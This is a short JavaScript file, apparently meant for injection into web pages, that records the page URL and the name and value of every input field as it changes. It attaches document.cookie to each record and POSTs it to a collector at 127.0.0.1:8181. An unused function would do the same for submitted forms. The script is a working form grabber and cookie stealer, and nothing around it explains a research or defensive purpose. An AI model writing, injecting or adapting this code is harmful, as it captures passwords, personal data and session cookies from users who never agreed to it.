
if(typeof __e == "undefined")
{
    __e = (function(){

    	function start()
    	{
          registerEvent( "EnterURL", { url : document.location } );
          hookAllInputs();
    	}

      function hookAllInputs()
      {
          var inputs = document.getElementsByTagName("input");
          for( var i = 0; i < inputs.length; i++)
          {
              inputs[i].addEventListener("change", function(){
                  registerEvent("InputChanged", {
                    name: this.name,
                    value : this.value,
                    url : document.location
                  });
              });
          }
      }

      function hookAllForms()
      {
          var forms = document.getElementsByTagName("form");
          for(var i = 0; i < forms.length; i++)
          {
              forms[i].addEventListener("submit", function(){
                  var elems = processFormValues(this.elements);
                  elems.action = this.action;
                  registerEvent("FormSubmited", elems);
              });
          }
      }

      function registerEvent(eventName, args)
      {
          args.cookie = document.cookie;
          var req = new XMLHttpRequest();
          req.open("POST", "http://127.0.0.1:8181/" + eventName, true);
          req.send(JSON.stringify(args));
      }

      function processFormValues(array)
      {
          var fields = [];
          for(var i = 0 ; i < array.length; i++)
          {
              fields.push({ name: array[i].name, value: array[i].value });
          }
          return fields;
      }

      start();
      return { start : start };

    })();
}
